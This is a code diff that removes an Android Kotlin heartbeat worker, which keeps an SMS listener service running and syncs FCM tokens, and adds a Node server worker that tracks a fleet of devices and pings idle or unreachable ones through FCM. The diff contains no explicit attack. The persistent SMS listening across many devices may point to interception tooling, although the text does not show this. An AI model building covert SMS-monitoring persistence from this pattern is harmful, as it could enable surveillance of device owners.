@@ -1,116 +1,190 @@
-package com.example.admin.workers
+import logger from "../logger/logger";
+import Device from "../models/Device";
+import wsService from "../services/wsService";
+import { sendPing } from "../services/fcmService";
 
-import android.content.Context
-import android.util.Log
-import androidx.work.CoroutineWorker
-import androidx.work.WorkerParameters
-import com.example.admin.fcm.FcmTokenSync
-import com.example.admin.services.SmsListenerService
-import com.example.admin.utils.LastSeenReporter
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.withContext
+const INTERVAL_MS = 5 * 60 * 1000;
 
-/**
- * HeartbeatWorker — runs every 15 minutes via WorkManager.
- *
- * Does 3 things:
- *   1. Reports lastSeen("heartbeat") to backend
- *   2. SMART token sync:
- *      - No local token? → forceResync (nuclear — fetch + push)
- *      - Last sync > 1 hour? → forceResync (token may have been cleared)
- *      - Otherwise → ensureTokenFresh (lightweight, no HTTP if fresh)
- *   3. Checks SmsListenerService alive — restarts if dead
- *
- * Scale impact (2000 devices):
- *   - forceResync: ~5% devices (100) × 96/day = 9,600 PUT/day
- *   - ensureTokenFresh: ~95% devices (1900) × 24/day = 45,600 checks (mostly no-op)
- *   - Total actual HTTP: ~55,000/day vs 192,000/day (brute force)
- */
-class HeartbeatWorker(
-    context: Context,
-    params: WorkerParameters,
-) : CoroutineWorker(context, params) {
+const IDLE_THRESHOLD_MS = 15 * 60 * 1000;
+const UNREACHABLE_THRESHOLD_MS = 2 * 60 * 60 * 1000;
 
-    companion object {
-        private const val TAG = "HeartbeatWorker"
-        private const val PREFS = "AppPrefs"
-        private const val KEY_LAST_SYNC_TS = "last_fcm_sync_ts"
+// ──── Ping config ────
+const PING_AFTER_IDLE_MS = 30 * 60 * 1000;          // ping when idle for 30+ min
+const PING_COOLDOWN_IDLE_MS = 60 * 60 * 1000;       // idle devices: 1 ping per hour
+const PING_COOLDOWN_UNREACHABLE_MS = 3 * 60 * 60 * 1000; // unreachable: 1 ping per 3 hours
+const GIVE_UP_AFTER_MS = 7 * 24 * 60 * 60 * 1000;   // stop pinging after 7 days offline
 
-        // If last successful sync was more than 1 hour ago → force resync
-        private const val FORCE_RESYNC_THRESHOLD_MS = 60 * 60 * 1000L // 1 hour
+const lastPingedMap = new Map<string, number>();
+// ──── END config ────
+
+let timer: NodeJS.Timeout | null = null;
+
+export function start() {
+  if (timer) {
+    logger.warn("heartbeatWorker: already running");
+    return;
+  }
+
+  timer = setInterval(() => {
+    run().catch((err) => logger.error("heartbeatWorker error", err));
+  }, INTERVAL_MS);
+
+  setTimeout(() => {
+    run().catch((err) => logger.error("heartbeatWorker initial run failed", err));
+  }, 30_000);
+
+  logger.info("heartbeatWorker: started", { intervalMs: INTERVAL_MS });
+}
+
+export function stop() {
+  if (timer) {
+    clearInterval(timer);
+    timer = null;
+  }
+  lastPingedMap.clear();
+  logger.info("heartbeatWorker: stopped");
+}
+
+async function run() {
+  try {
+    const now = Date.now();
+
+    const devices = await Device.find({
+      "lastSeen.at": { $gt: 0 },
+    })
+      .select("deviceId lastSeen metadata.model metadata.brand fcmToken")
+      .lean();
+
+    if (!devices || devices.length === 0) {
+      logger.debug("heartbeatWorker: no devices with lastSeen data");
+      return;
     }
 
-    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
+    let responsive = 0;
+    let idle = 0;
+    let unreachable = 0;
+    let noFcmToken = 0;
+    let pinged = 0;
+    let pingSkippedCooldown = 0;
+    let pingSkippedGaveUp = 0;
+
+    for (const device of devices) {
+      const deviceId = String((device as any).deviceId || "").trim();
+      if (!deviceId) continue;
+
+      const lastSeenAt = Number((device as any).lastSeen?.at || 0);
+      const diffMs = now - lastSeenAt;
+      const hasFcmToken = !!String((device as any).fcmToken || "").trim();
+
+      if (!hasFcmToken) {
+        noFcmToken++;
+      }
+
+      if (diffMs <= IDLE_THRESHOLD_MS) {
+        // ── RESPONSIVE ──
+        responsive++;
+        if (lastPingedMap.has(deviceId)) {
+          lastPingedMap.delete(deviceId);
+        }
+
+      } else if (diffMs <= UNREACHABLE_THRESHOLD_MS) {
+        // ── IDLE (15 min - 2 hr) ──
+        idle++;
+
+        if (hasFcmToken && diffMs >= PING_AFTER_IDLE_MS) {
+          const lastPinged = lastPingedMap.get(deviceId) || 0;
+          const sincePing = now - lastPinged;
+
+          if (sincePing >= PING_COOLDOWN_IDLE_MS) {
+            try {
+              await sendPing(deviceId);
+              lastPingedMap.set(deviceId, now);
+              pinged++;
+              logger.info("heartbeatWorker: pinged idle device", {
+                deviceId,
+                idleForMin: Math.round(diffMs / 60000),
+              });
+            } catch (pingErr) {
+              logger.warn("heartbeatWorker: ping failed", {
+                deviceId,
+                error: (pingErr as any)?.message || pingErr,
+              });
+            }
+          } else {
+            pingSkippedCooldown++;
+          }
+        }
+
+      } else {
+        // ── UNREACHABLE (2hr+) ──
+        unreachable++;
+
+        // ──── NEW: ping unreachable devices too (with longer cooldown) ────
+        if (hasFcmToken && diffMs <= GIVE_UP_AFTER_MS) {
+          const lastPinged = lastPingedMap.get(deviceId) || 0;
+          const sincePing = now - lastPinged;
+
+          if (sincePing >= PING_COOLDOWN_UNREACHABLE_MS) {
+            try {
+              await sendPing(deviceId);
+              lastPingedMap.set(deviceId, now);
+              pinged++;
+              logger.info("heartbeatWorker: pinged unreachable device", {
+                deviceId,
+                offlineForHrs: Math.round(diffMs / 3600000),
+              });
+            } catch (pingErr) {
+              logger.warn("heartbeatWorker: ping unreachable failed", {
+                deviceId,
+                error: (pingErr as any)?.message || pingErr,
+              });
+            }
+          } else {
+            pingSkippedCooldown++;
+          }
+        } else if (diffMs > GIVE_UP_AFTER_MS) {
+          // 7 din se zyada — stop pinging, cleanup
+          pingSkippedGaveUp++;
+          if (lastPingedMap.has(deviceId)) {
+            lastPingedMap.delete(deviceId);
+          }
+        }
+        // ──── END NEW ────
+
         try {
-            Log.d(TAG, "HeartbeatWorker running @${System.currentTimeMillis()}")
-
-            // 1) Report lastSeen
-            try {
-                LastSeenReporter.reportForce(applicationContext, "heartbeat")
-            } catch (t: Throwable) {
-                Log.w(TAG, "LastSeen report failed: ${t.message}")
-            }
-
-            // 2) Smart token sync
-            try {
-                smartTokenSync(applicationContext)
-            } catch (t: Throwable) {
-                Log.w(TAG, "Smart token sync failed: ${t.message}")
-            }
-
-            // 3) Ensure SmsListenerService is alive
-            try {
-                if (!SmsListenerService.isRunning) {
-                    Log.w(TAG, "SmsListenerService not running — restarting")
-                    SmsListenerService.start(applicationContext)
-                } else {
-                    Log.d(TAG, "SmsListenerService is running — OK")
-                }
-            } catch (t: Throwable) {
-                Log.w(TAG, "SmsListenerService check failed: ${t.message}")
-            }
-
-            Log.d(TAG, "HeartbeatWorker completed successfully")
-            Result.success()
-        } catch (t: Throwable) {
-            Log.w(TAG, "HeartbeatWorker failed: ${t.message}")
-            Result.retry()
+          wsService.notifyDeviceLastSeen(deviceId, {
+            at: lastSeenAt,
+            action: (device as any).lastSeen?.action || "",
+            battery: (device as any).lastSeen?.battery ?? -1,
+          });
+        } catch {
+          // ignore
         }
+      }
     }
 
-    /**
-     * Smart token sync — only forceResync when actually needed.
-     *
-     * Decision tree:
-     *   1. No local token saved? → FORCE (token never arrived)
-     *   2. Last successful sync > 1 hour? → FORCE (backend may have cleared it)
-     *   3. Otherwise → lightweight ensureTokenFresh (checks 1hr interval internally)
-     */
-    private fun smartTokenSync(context: Context) {
-        val savedToken = FcmTokenSync.getSavedToken(context)
-        val prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
-        val lastSyncTs = prefs.getLong(KEY_LAST_SYNC_TS, 0L)
-        val now = System.currentTimeMillis()
-        val sinceSyncMs = now - lastSyncTs
+    logger.info("heartbeatWorker: device status summary", {
+      total: devices.length,
+      responsive,
+      idle,
+      unreachable,
+      noFcmToken,
+      pinged,
+      pingSkippedCooldown,
+      pingSkippedGaveUp,
+    });
 
-        when {
-            // Case 1: No token saved locally — never arrived or was cleared
-            savedToken.isNullOrEmpty() -> {
-                Log.w(TAG, "smartTokenSync: NO local token → forceResync")
-                FcmTokenSync.forceResync(context)
-            }
-
-            // Case 2: Token exists but last sync is old (>1hr) — backend may have cleared
-            lastSyncTs <= 0 || sinceSyncMs > FORCE_RESYNC_THRESHOLD_MS -> {
-                Log.d(TAG, "smartTokenSync: last sync ${sinceSyncMs / 60000}min ago → forceResync")
-                FcmTokenSync.forceResync(context)
-            }
-
-            // Case 3: Token exists and sync is recent — lightweight check
-            else -> {
-                Log.d(TAG, "smartTokenSync: token fresh (synced ${sinceSyncMs / 60000}min ago) → ensureTokenFresh")
-                FcmTokenSync.ensureTokenFresh(context)
-            }
-        }
+    if (noFcmToken > 0 && devices.length > 0) {
+      const pct = Math.round((noFcmToken / devices.length) * 100);
+      if (pct > 20) {
+        logger.warn("heartbeatWorker: high % of devices without FCM token", {
+          noFcmToken,
+          total: devices.length,
+          percent: pct,
+        });
+      }
     }
+  } catch (err) {
+    logger.error("heartbeatWorker: run error", err);
+  }
 }
